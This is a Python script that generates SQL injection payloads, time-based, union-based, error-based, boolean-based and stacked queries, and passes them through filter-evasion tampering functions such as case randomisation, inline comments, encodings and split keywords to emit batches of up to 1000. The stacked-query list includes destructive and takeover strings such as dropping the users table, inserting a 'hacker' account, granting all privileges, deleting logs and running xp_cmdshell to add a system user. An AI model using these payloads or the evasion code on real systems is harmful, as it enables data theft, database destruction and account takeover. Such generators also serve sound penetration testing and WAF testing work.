import random
import string
import urllib.parse


def randomize_case(query):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in query)

def insert_whitespace(query):
    return ' '.join(word + (' ' * random.randint(0, 2)) for word in query.split())

def comment_injection(query):
    comments = ['/**/', '/*!' + ''.join(random.choices(string.ascii_letters, k=3)) + '*/', '--', '#', ';--']
    words = query.split()
    return ' '.join(word + random.choice(comments) if random.random() < 0.3 else word for word in words)

def char_encode(query):
    encode_type = random.choice(['url', 'hex', 'unicode'])
    if encode_type == 'url':
        return urllib.parse.quote(query)
    elif encode_type == 'hex':
        return ''.join([f'0x{ord(c):02x}' for c in query])
    else:  # unicode
        return ''.join([f'\\u00{ord(c):02x}' for c in query])

def keyword_substitution(query):
    substitutions = {
        'SELECT': ['SELECT', 'SEL%00ECT', 'SE/**/LECT', 'S%a0E%09L%0dE%0aC%09T'],
        'UNION': ['UNION', 'UN%20ION', 'UN/**/ION', 'UNI%0dON'],
        'FROM': ['FROM', 'FR%0dOM', 'FR/**/OM', 'F%23%0aROM'],
        'WHERE': ['WHERE', 'WH%00ERE', 'WH/**/ERE', 'W%0cHERE'],
        'AND': ['AND', 'AN%0cD', 'A%0dND', '/**/AND/**/'],
        'OR': ['OR', '%0bOR', '/**/OR/**/', 'O%0dR']
    }
    for keyword, alternatives in substitutions.items():
        query = query.replace(keyword, random.choice(alternatives))
    return query

def special_char_injection(query):
    special_chars = ['%01', '%02', '%03', '%04', '%0a', '%0d', '%09']
    return ''.join(c + random.choice(special_chars) if random.random() < 0.2 else c for c in query)

def generate_time_based():
    techniques = [
        f"' AND (SELECT * FROM (SELECT(SLEEP({random.randint(1,5)})))a)--",
        f"' AND (SELECT pg_sleep({random.randint(1,5)}))--",
        f"' AND (SELECT CASE WHEN (1=1) THEN sqlite_version() ELSE 1*random() END)--",
        f"'; WAITFOR DELAY '00:00:0{random.randint(1,5)}'--",
        f"') OR '1'='1' AND (SELECT 1 FROM (SELECT(SLEEP({random.randint(1,5)})))a)--",
        f"1 OR SLEEP({random.randint(1,5)})",
        f"BENCHMARK({random.randint(1000000,5000000)},SHA1(1))",
        f"'; WAITFOR DELAY '00:00:{random.randint(1,59)}'--",
        f"'; IF (SELECT COUNT(*) FROM information_schema.tables) > 0 WAITFOR DELAY '0:0:{random.randint(1,5)}'--",
        f"'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:{random.randint(1,5)}'--",
        f"' AND IF (1=1, SLEEP({random.randint(1,5)}), 0)--",
        f"' AND IF (1=2, SLEEP({random.randint(1,5)}), 0)--",
        f"'; WAITFOR DELAY '00:00:0{random.randint(1,10)}'--",
        f"' OR IF (SUBSTRING(@@version,1,1) = '5', SLEEP({random.randint(1,5)}), 0)--",
        f"'; SELECT CASE WHEN (1=1) THEN pg_sleep({random.randint(1,5)}) ELSE 0 END--",
        f"' AND IF(1=1, BENCHMARK(1000000, MD5('test')), 0)--",
        f"'; SELECT SLEEP({random.randint(1,10)})--",
        f"'; IF (EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema=database())) WAITFOR DELAY '0:0:{random.randint(1,10)}'--",
        f"' OR IF (EXISTS (SELECT 1 FROM information_schema.columns)), SLEEP({random.randint(1,5)}), 0)--",
        f"'; IF (EXISTS (SELECT * FROM users WHERE 1=1)) WAITFOR DELAY '00:00:0{random.randint(1,10)}'--",
        f"' AND (SELECT IF (EXISTS (SELECT * FROM users WHERE username='admin')), SLEEP({random.randint(1,5)}), 0))--",
        f"'; IF (EXISTS (SELECT * FROM information_schema.tables WHERE table_schema='public')) WAITFOR DELAY '0:0:{random.randint(1,10)}'--",
        f"'; IF (EXISTS (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')) WAITFOR DELAY '0:0:{random.randint(1,5)}'--",
        f"' OR (SELECT CASE WHEN (1=1) THEN SLEEP({random.randint(1,5)}) ELSE 0 END)--",
        f"'; IF (EXISTS (SELECT 1 FROM information_schema.columns WHERE column_name='password')) WAITFOR DELAY '0:0:{random.randint(1,10)}'--",
        f"' AND IF (EXISTS (SELECT 1 FROM sysobjects WHERE xtype='U')), SLEEP({random.randint(1,5)}), 0)--",
        f"'; IF (EXISTS (SELECT 1 FROM mysql.db WHERE user='root')) WAITFOR DELAY '0:0:{random.randint(1,10)}'--",
        f"'; IF (SELECT COUNT(*) FROM information_schema.schemata) > 0 WAITFOR DELAY '00:00:0{random.randint(1,10)}'--",
        f"' AND IF (EXISTS (SELECT 1 FROM pg_stat_activity WHERE pid > 0)), SLEEP({random.randint(1,5)}), 0)--",
        f"'; WAITFOR DELAY '00:00:{random.randint(1,5)}'--",
        f"'; IF (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 WAITFOR DELAY '0:0:{random.randint(1,5)}'--",
        f"'; IF (EXISTS (SELECT 1 FROM sys.tables WHERE name='users')) WAITFOR DELAY '00:00:0{random.randint(1,10)}'--"
    ]
    return random.choice(techniques)


def generate_union_based():
    columns = random.randint(2, 10)
    techniques = [
        f"' UNION SELECT {','.join(['NULL']*columns)}-- -",
        f"' UNION SELECT {','.join([f'NULL, CHAR({random.randint(65,90)})']*(columns-1))}-- -",
        f"' UNION ALL SELECT {','.join(['1']*columns)}-- -",
        f"' UNION SELECT {','.join([f'CONCAT(CHAR({random.randint(65,90)}),CHAR({random.randint(97,122)}))']*columns)}-- -",
        f"' UNION SELECT {','.join([f'IFNULL({random.randint(1,100)}, NULL)']*columns)}-- -",
        f"' UNION SELECT {','.join(['(SELECT 1)']*columns)}-- -",
        f"' UNION SELECT {','.join([f'REPEAT(CONCAT({random.randint(1,10)}), {random.randint(1,5)})']*columns)}-- -",
        f"' UNION SELECT {','.join(['RAND()']*columns)}-- -",
        f"' UNION SELECT {','.join([f'CHAR({random.randint(65,90)})']*columns)}-- -",
        f"' UNION SELECT {','.join([f'HEX({random.randint(1,255)})']*columns)}-- -",
        f"' UNION SELECT {','.join([f'CHAR(32+{random.randint(0,50)})']*columns)}-- -",
        f"' UNION SELECT {','.join(['GROUP_CONCAT(table_name)']*columns)} FROM information_schema.tables-- -",
        f"' UNION SELECT {','.join([f'TABLE_SCHEMA']*columns)} FROM information_schema.schemata-- -",
        f"' UNION ALL SELECT {','.join([f'COALESCE({random.randint(1,10)}, NULL)']*columns)}-- -",
        f"' UNION ALL SELECT {','.join([f'SUBSTRING(@@version, {random.randint(1,10)}, {random.randint(1,10)})']*columns)}-- -",
        f"' UNION SELECT {','.join(['1, 2, 3']*columns)}-- -",
        f"' UNION ALL SELECT {','.join([f'CONCAT({random.randint(1,100)}, {random.randint(1,100)})']*columns)}-- -",
        f"' UNION SELECT {','.join([f'REPLACE({random.randint(1,10)}, {random.randint(1,5)}, {random.randint(1,5)})']*columns)}-- -",
        f"' UNION SELECT {','.join(['NOW()']*columns)}-- -",
        f"' UNION SELECT {','.join([f'GROUP_CONCAT(schema_name)']*columns)} FROM information_schema.schemata-- -",
        f"' UNION SELECT {','.join([f'CHAR({random.randint(48,57)})']*columns)}-- -",
        f"' UNION SELECT {','.join([f'REPEAT(CONCAT({random.randint(1,20)}), {random.randint(1,5)})']*columns)}-- -",
        f"' UNION SELECT {','.join([f'CONCAT_WS("_", {random.randint(1,10)}, {random.randint(1,10)})']*columns)}-- -",
        f"' UNION SELECT {','.join([f'IFNULL((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=database()), "Unknown")'] * columns)}-- -"
    ]
    return random.choice(techniques)


def generate_error_based():
    techniques = [
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CTX_SYSTEM.DRIVE_MOUNT((SELECT version FROM v$instance))--",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1 AND ROWNUM=1)--",
        "' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -",
        "' OR 1=CONVERT(int, (SELECT COUNT(*) FROM information_schema.tables))--",
        "' AND 1=CONVERT(int, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))--",
        "' AND 1=CONVERT(int, (SELECT CONCAT_WS(',', table_schema, table_name) FROM information_schema.tables))--",
        "' AND (SELECT 1 FROM dual WHERE 1=1 AND (SELECT COUNT(*) FROM users))--",
        "' OR 1=CONVERT(int, (SELECT IFNULL((SELECT COUNT(*) FROM information_schema.schemata), 0)))--",
        "' OR 1=IFNULL((SELECT COUNT(*) FROM information_schema.tables), 0)--",
        "' OR 1=CONVERT(int, (SELECT COUNT(*) FROM sysobjects WHERE xtype='U'))--",
        "' AND (SELECT IF(1=1, (SELECT COUNT(*) FROM mysql.db WHERE user='root'), 0))--",
        "' AND (SELECT IF(1=1, (SELECT @@version), 0))--",
        "' OR (SELECT CASE WHEN (1=1) THEN SUBSTRING(@@version,1,1) ELSE NULL END)--",
        "' OR (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM information_schema.tables) ELSE NULL END)--",
        "' AND (SELECT CASE WHEN (1=1) THEN (SELECT 1 UNION SELECT 2) ELSE 0 END)--",
        "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM sysobjects WHERE xtype='U'))--",
        "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM mysql.user))--",
        "' OR (SELECT CASE WHEN (1=1) THEN (SELECT IFNULL(SUBSTRING(@@version,1,1), 0)) ELSE NULL END)--",
        "' AND (SELECT IF(1=1, (SELECT COUNT(*) FROM sysobjects WHERE xtype='U'), 0))--",
        "' AND 1=IFNULL((SELECT COUNT(*) FROM sysobjects WHERE xtype='U'), 0)--",
        "' OR 1=CONVERT(int, (SELECT COUNT(*) FROM sys.tables))--",
        "' AND (SELECT IF(1=1, (SELECT 1 FROM information_schema.tables WHERE table_schema='public'), 0))--",
        "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM pg_stat_activity))--",
        "' OR 1=CONVERT(int, (SELECT COUNT(*) FROM mysql.user))--",
        "' OR (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM information_schema.schemata) ELSE 0 END)--",
        "' OR 1=CONVERT(int, (SELECT COUNT(*) FROM sysobjects WHERE xtype='U'))--",
        "' OR (SELECT CASE WHEN (1=1) THEN SUBSTRING((SELECT VERSION()), 1, 1) ELSE NULL END)--",
        "' AND (SELECT CASE WHEN (1=1) THEN SUBSTRING((SELECT table_schema FROM information_schema.schemata LIMIT 1), 1, 1) ELSE NULL END)--"
    ]
    return random.choice(techniques)


def generate_boolean_based():
    techniques = [
        "' AND 1=1--",
        "' OR 'x'='x",
        "' AND substring(database(),1,1)='a'--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>95--",
        "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)=1--",
        "' OR 1=2--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
        "' OR 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "' AND 1=(SELECT COUNT(*) FROM sys.tables)--",
        "' OR 1=CONVERT(int, (SELECT COUNT(*) FROM sysobjects WHERE xtype='U'))--",
        "' AND 1=(SELECT IFNULL((SELECT COUNT(*) FROM information_schema.schemata), 0))--",
        "' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM information_schema.tables) ELSE 0 END)=1--",
        "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT IF (EXISTS (SELECT 1 FROM users WHERE username='admin')), 1, 0))--",
        "' OR 1=(SELECT COUNT(*) FROM mysql.user)--",
        "' AND (SELECT CASE WHEN (1=1) THEN COUNT(*) ELSE NULL END FROM information_schema.schemata)--",
        "' AND (SELECT IF (1=1, COUNT(*), NULL) FROM information_schema.tables)--",
        "' AND (SELECT CASE WHEN (1=1) THEN COUNT(*) ELSE NULL END FROM sysobjects WHERE xtype='U')--",
        "' OR (SELECT CASE WHEN (1=1) THEN COUNT(*) ELSE NULL END FROM information_schema.tables)--",
        "' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U')--",
        "' OR (SELECT CASE WHEN (1=1) THEN COUNT(*) ELSE NULL END FROM mysql.user)--",
        "' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM information_schema.tables) ELSE NULL END)=1--",
        "' OR (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0--",
        "' AND (SELECT IF (EXISTS (SELECT 1 FROM sysobjects WHERE xtype='U')), COUNT(*), NULL))--",
        "' OR (SELECT CASE WHEN (1=1) THEN COUNT(*) ELSE NULL END FROM information_schema.schemata)--"
    ]
    return random.choice(techniques)


def generate_stacked_queries():
    techniques = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users (username,password) VALUES ('hacker','password123')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; CREATE USER malicious IDENTIFIED BY 'password123'--",
        "'; DELETE FROM logs WHERE 1=1--",
        "'; CREATE TABLE test (id INT)--",
        "'; ALTER TABLE users ADD COLUMN hacked BOOLEAN--",
        "'; INSERT INTO logs (event) VALUES ('Hacked')--",
        "'; GRANT ALL PRIVILEGES ON *.* TO 'malicious'@'localhost'--",
        "'; REVOKE ALL PRIVILEGES ON *.* FROM 'malicious'@'localhost'--",
        "'; TRUNCATE TABLE orders--",
        "'; UPDATE settings SET value='new_value' WHERE key='important_setting'--",
        "'; SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users)--",
        "'; SET @var = (SELECT COUNT(*) FROM users)--",
        "'; INSERT INTO audit (action) VALUES ('admin access')--",
        "'; CREATE PROCEDURE sp_test AS BEGIN SELECT 1 END--",
        "'; DROP PROCEDURE IF EXISTS sp_test--",
        "'; CALL sp_test--",
        "'; SELECT * FROM information_schema.tables--",
        "'; INSERT INTO notifications (message) VALUES ('Alert')--",
        "'; DELETE FROM temp_table WHERE condition=1--",
        "'; CREATE VIEW v_test AS SELECT * FROM users--",
        "'; INSERT INTO logs (event) VALUES ('User activity')--",
        "'; EXEC sp_addrolemember 'db_owner', 'malicious'--",
        "'; SET @sql = 'DROP TABLE temp'; EXEC(@sql)--",
        "'; INSERT INTO audit (action) VALUES ('Database hacked')--",
        "'; EXEC xp_cmdshell 'net user hacker /add'--",
        "'; INSERT INTO users (username, password) VALUES ('admin', 'admin')--",
        "'; EXEC sp_helptext 'stored_procedure_name'--",
        "'; DELETE FROM users WHERE username='admin'--",
        "'; ALTER TABLE users ADD COLUMN hacked INT DEFAULT 1--",
        "'; EXEC xp_cmdshell 'del /f /q C:\\temp\\malicious_file.txt'--"
    ]
    return random.choice(techniques)


def smart_tamper(query):
    tampering_functions = [
        randomize_case,
        insert_whitespace,
        comment_injection,
        char_encode,
        keyword_substitution,
        special_char_injection
    ]
    # Apply 1 to 3 tampering functions randomly
    for _ in range(random.randint(1, 3)):
        func = random.choice(tampering_functions)
        query = func(query)
    return query

def generate_payload():
    generators = [
        generate_time_based,
        generate_union_based,
        generate_error_based,
        generate_boolean_based,
        generate_stacked_queries
    ]
    return random.choice(generators)()

# Generate multiple payloads
def generate_payloads(n=1000):
    return [smart_tamper(generate_payload()) for _ in range(n)]